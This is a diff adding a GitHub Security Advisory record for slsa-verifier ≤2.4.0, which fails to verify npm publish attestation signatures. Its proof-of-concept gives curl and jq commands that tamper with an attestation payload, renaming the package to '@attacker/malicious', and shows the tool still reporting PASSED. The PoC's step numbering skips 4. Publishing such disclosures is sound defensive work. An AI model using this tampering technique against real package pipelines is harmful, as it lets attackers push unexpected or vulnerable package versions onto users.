@@ -1,0 +1,92 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-r2xv-vpr2-42m9",
+  "modified": "2023-11-09T16:14:39Z",
+  "published": "2023-11-08T19:15:55Z",
+  "aliases": [
+
+  ],
+  "summary": "slsa-verifier vulnerable to mproper validation of npm's publish attestations",
+  "details": "### Summary\n\n`slsa-verifier<=2.4.0` does not correctly verify npm's [publish](https://github.com/npm/attestation/tree/main/specs/publish/v0.1) attestations signature.\n\n### Proof of concept\n\nSteps to reproduce:\n1. `curl -Sso attestations.json $(npm view @trishankatdatadog/supreme-goggles --json | jq -r '.dist.attestations.url')`\n2. `curl -Sso supreme-goggles.tgz \"$(npm view @trishankatdatadog/supreme-goggles --json | jq -r '.dist.tarball')\"`\n3. In `attestations.json`, take the value addressed by the `jq` selector `.attestations[0].bundle.dsseEnvelope.payload`, base64decode it, tamper with it, base64encode that, and replace the original value with that. Save the file as `attestations_tampered.json`.\n   Here is an example command to replace the package name with `@attacker/malicious`:\n   `jq -r \".attestations[0].bundle.dsseEnvelope.payload = \\\"$(jq -r '.attestations[0].bundle.dsseEnvelope.payload | @base64d' < attestations.json | jq '.subject[0].name = \"pkg:npm/%40attacker/malicious\"' | base64 -w0)\\\"\" < attestations.json > attestations_tampered.json`\n5. `SLSA_VERIFIER_EXPERIMENTAL=1 slsa-verifier verify-npm-package supreme-goggles.tgz --attestations-path attestations_tampered.json --builder-id \"https://github.com/actions/runner/github-hosted\" --package-name \"@trishankatdatadog/supreme-goggles\" --package-version 1.0.5 --source-uri github.com/trishankatdatadog/supreme-goggles`\n6. The result is that `slsa-verifier` fails to detect this tampering of the publish attestation (unlike with the provenance attestation) and returns `PASSED`.\n\n### Impact\n\nAn attacker who controls what packages and attestations are shown to a user _can_ associate a package with an arbitrary name and version that do _not_ match what the user expects from the publish attestation. Furthermore, the package digest in the publish attestation need _not_ match its counterpart in the provenance attestation. However, the attacker _cannot_ associate the given package with an arbitrary source and builder that the user does not expect from the provenance attestation. Thus, the attacker could, for example, convince package managers to install authentic but older versions of packages that contain known, exploitable vulnerabilities.\n\nSeverity is considered low because 1) it does not invalidate the provenance and 2) support for npm is currently experimental.\n\n### Patches\n\nFixed by PR [#705](https://github.com/slsa-framework/slsa-verifier/pull/705) and released in versions `>=2.4.1`.\n\n### Workarounds\n\nThere is no easy way for users to fix or remediate this vulnerability without upgrading, short of verifying npm's publish attestations themselves, _and_ cross-verifying it against GHA's provenance attestations.\n\n### References\n\n* [Original OpenSSF Slack thread](https://openssf.slack.com/archives/C03PDLFET5W/p1695330038983179)\n",
+  "severity": [
+
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/slsa-framework/slsa-verifier/v2"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.4.1-rc.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 2.4.0"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/slsa-framework/slsa-verifier"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.4.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/slsa-framework/slsa-verifier/security/advisories/GHSA-r2xv-vpr2-42m9"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/slsa-framework/slsa-verifier/pull/705"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/slsa-framework/slsa-verifier/commit/f6ae402f458b347d2c414f1d053fc1f8257888d0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/npm/attestation/tree/main/specs/publish/v0.1"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/slsa-framework/slsa-verifier"
+    },
+    {
+      "type": "WEB",
+      "url": "https://openssf.slack.com/archives/C03PDLFET5W/p1695330038983179"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+
+    ],
+    "severity": "LOW",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-11-08T19:15:55Z",
+    "nvd_published_at": null
+  }
+}
